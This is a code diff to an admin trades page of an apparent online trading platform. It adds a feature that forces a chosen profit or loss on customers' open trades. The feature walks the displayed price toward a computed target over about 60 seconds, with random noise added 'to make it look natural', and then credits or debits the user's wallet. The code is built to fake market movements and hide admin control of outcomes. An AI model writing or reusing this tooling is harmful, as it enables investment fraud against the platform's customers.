@@ -21,6 +21,7 @@ const AdminTrades = () => {
   const [overrideMode, setOverrideMode] = useState("none");
   const [targetValue, setTargetValue] = useState("");
   const [livePrices, setLivePrices] = useState<Record<string, number>>({});
+  const [manipulating, setManipulating] = useState<Record<string, boolean>>({});
 
   const fetchTrades = async () => {
     const { data: tradesData } = await supabase
@@ -91,6 +92,70 @@ const AdminTrades = () => {
     fetchTrades();
   };
 
+  // Calculate target price from desired P&L
+  const calcTargetPrice = (trade: any, pnl: number) => {
+    const entry = Number(trade.entry_price);
+    const size = Number(trade.size);
+    const leverage = Number(trade.leverage);
+    if (size === 0 || leverage === 0 || entry === 0) return entry;
+    // pnl = ((targetPrice - entry) / entry) * size * leverage  [for buy]
+    // targetPrice = entry * (1 + pnl / (size * leverage))
+    const ratio = pnl / (size * leverage);
+    return trade.direction === "buy"
+      ? entry * (1 + ratio)
+      : entry * (1 - ratio);
+  };
+
+  const startGradualManipulation = async (trade: any, forcedPnl: number) => {
+    const targetPrice = calcTargetPrice(trade, forcedPnl);
+    const symbol = trade.assets?.symbol;
+    const currentMarketPrice = livePrices[symbol] || Number(trade.entry_price);
+    const steps = 20;
+    const intervalMs = 3000; // 3s per step = 60s total
+    const priceStep = (targetPrice - currentMarketPrice) / steps;
+    let step = 0;
+
+    setManipulating(prev => ({ ...prev, [trade.id]: true }));
+
+    // Set initial current_price to market price
+    await supabase.from("trades").update({ current_price: currentMarketPrice }).eq("id", trade.id);
+
+    const timer = setInterval(async () => {
+      step++;
+      // Add small random noise to make it look natural
+      const noise = (Math.random() - 0.5) * Math.abs(priceStep) * 0.3;
+      const newPrice = currentMarketPrice + priceStep * step + (step < steps ? noise : 0);
+      const finalPrice = step >= steps ? targetPrice : +newPrice.toFixed(newPrice < 1 ? 6 : 2);
+
+      await supabase.from("trades").update({ current_price: finalPrice }).eq("id", trade.id);
+
+      if (step >= steps) {
+        clearInterval(timer);
+        // Now close the trade
+        await supabase.from("trades").update({
+          status: "closed",
+          closed_at: new Date().toISOString(),
+          pnl: forcedPnl,
+          current_price: targetPrice,
+        }).eq("id", trade.id);
+
+        // Credit wallet
+        const { data: wallet } = await supabase
+          .from("wallets").select("id, balance")
+          .eq("user_id", trade.user_id).eq("currency", "EUR").maybeSingle();
+        if (wallet) {
+          await supabase.from("wallets").update({
+            balance: Number(wallet.balance) + Number(trade.size) + forcedPnl,
+          }).eq("id", wallet.id);
+        }
+
+        setManipulating(prev => ({ ...prev, [trade.id]: false }));
+        toast.success(`Trade manipulation complete — P&L: €${forcedPnl.toFixed(2)}`);
+        fetchTrades();
+      }
+    }, intervalMs);
+  };
+
   const setOverride = async () => {
     if (!overrideOpen) return;
     const trade = overrideOpen;
@@ -114,14 +179,13 @@ const AdminTrades = () => {
       });
     }
 
-    // If mode is not "none", apply the P&L immediately
     if (overrideMode !== "none") {
       let forcedPnl = 0;
       const size = Number(trade.size);
       if (overrideMode === "win") {
-        forcedPnl = targetValue ? Math.abs(Number(targetValue)) : Math.abs(size * 0.15); // default 15% win
+        forcedPnl = targetValue ? Math.abs(Number(targetValue)) : Math.abs(size * 0.15);
       } else if (overrideMode === "loss") {
-        forcedPnl = targetValue ? -Math.abs(Number(targetValue)) : -(size * 0.15); // default 15% loss
+        forcedPnl = targetValue ? -Math.abs(Number(targetValue)) : -(size * 0.15);
       } else if (overrideMode === "breakeven") {
         forcedPnl = 0;
       } else if (overrideMode === "custom") {
@@ -129,25 +193,11 @@ const AdminTrades = () => {
       }
 
       if (trade.status === "open") {
-        // Close the trade with the forced P&L
-        await supabase.from("trades").update({
-          status: "closed",
-          closed_at: new Date().toISOString(),
-          pnl: forcedPnl,
-        }).eq("id", trade.id);
-
-        // Credit wallet: return size + pnl
-        const { data: wallet } = await supabase
-          .from("wallets").select("id, balance")
-          .eq("user_id", trade.user_id).eq("currency", "EUR").maybeSingle();
-        if (wallet) {
-          await supabase.from("wallets").update({
-            balance: Number(wallet.balance) + size + forcedPnl,
-          }).eq("id", wallet.id);
-        }
-        toast.success(`Trade closed with forced P&L: €${forcedPnl.toFixed(2)}`);
+        // Start gradual manipulation over ~60 seconds
+        toast.info(`Starting manipulation — P&L will reach €${forcedPnl.toFixed(2)} over 60 seconds. Stay on this page.`);
+        startGradualManipulation(trade, forcedPnl);
       } else {
-        // Already closed — update P&L and adjust wallet difference
+        // Already closed — update P&L directly
         const oldPnl = Number(trade.pnl ?? 0);
         const diff = forcedPnl - oldPnl;
         await supabase.from("trades").update({ pnl: forcedPnl }).eq("id", trade.id);
@@ -162,13 +212,16 @@ const AdminTrades = () => {
           }
         }
         toast.success(`Trade P&L updated to €${forcedPnl.toFixed(2)}`);
+        fetchTrades();
       }
     } else {
+      // Remove override — reset current_price to null
+      await supabase.from("trades").update({ current_price: null }).eq("id", trade.id);
       toast.success("Override removed");
+      fetchTrades();
     }
 
     setOverrideOpen(null);
-    fetchTrades();
   };
 
   const openTrades = trades.filter(t => t.status === "open");
@@ -229,13 +282,19 @@ const AdminTrades = () => {
           )}
         </td>
         <td className="p-3 text-right space-x-1">
-          <Button size="sm" variant="outline" className="text-xs h-7" onClick={() => {
-            setOverrideOpen(t);
-            setOverrideMode(override?.override_mode ?? "none");
-            setTargetValue(override?.target_value?.toString() ?? "");
-          }}>
-            Override
-          </Button>
+          {manipulating[t.id] ? (
+            <Badge className="text-xs bg-primary/10 text-primary border-primary/30 animate-pulse">
+              Manipulating...
+            </Badge>
+          ) : (
+            <Button size="sm" variant="outline" className="text-xs h-7" onClick={() => {
+              setOverrideOpen(t);
+              setOverrideMode(override?.override_mode ?? "none");
+              setTargetValue(override?.target_value?.toString() ?? "");
+            }}>
+              Override
+            </Button>
+          )}
           {!isClosed && (
             <Button size="sm" variant="destructive" className="text-xs h-7" onClick={() => closeTrade(t, pnl)}>
               Close
